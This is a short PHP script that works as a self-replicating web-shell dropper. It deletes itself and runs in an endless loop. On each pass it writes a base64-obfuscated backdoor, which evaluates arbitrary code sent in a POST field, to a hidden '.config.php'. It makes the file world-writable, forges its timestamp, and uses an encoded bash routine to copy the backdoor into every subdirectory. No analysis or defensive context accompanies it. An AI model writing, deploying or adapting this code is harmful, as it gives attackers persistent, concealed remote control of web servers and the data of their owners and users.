<?php
 ignore_user_abort(true);
 set_time_limit(0);
 unlink(__FILE__);
 $file = ".config.php";
 $code = base64_decode("PD9waHAgIEBldmFsKCRfUE9TVFsnc291bm8nXSk7ICA/Pg==");
 while(true) {
     file_put_contents($file, $code);
     system("chmod 777 .config.php");
     touch(".config.php", mktime(20,15,1,11,28,2016));
     system("echo dHJhdmVyZGlyKCkocHVzaGQgIiQxIiA+IC9kZXYvbnVsbCAyPiYxO2ZvciBmaWxlIGluIGBscyAtMWA7ZG8gaWYgdGVzdCAtZCAiJGZpbGUiO3RoZW4gY3AgJFBXRC8uY29uZmlnLnBocCAkUFdELyRmaWxlO2VjaG8gIiRQV0QvJGZpbGUiO3RyYXZlcmRpciAiJGZpbGUiICIkKCh0YWIgKyAxICApKSI7Zmk7ZG9uZSk7dHJhdmVyZGly | base64 -d > .config.sh");
     $asd = system("bash .config.sh");
     usleep(1000);
 }
?>